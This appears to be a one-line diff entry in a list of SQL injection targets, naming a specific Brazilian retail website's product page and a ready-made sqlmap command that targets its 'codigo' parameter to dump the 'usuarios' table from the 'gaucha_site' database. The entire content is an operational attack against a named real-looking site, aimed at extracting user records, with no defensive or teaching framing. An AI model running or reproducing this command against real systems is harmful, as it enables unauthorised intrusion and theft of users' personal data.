@@ -1,0 +1,1 @@
+https://www.gauchadecoracoes.com.br/detalhe.php?codigo=99 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.gauchadecoracoes.com.br/detalhe.php?codigo=99 -D gaucha_site -T usuarios --dump
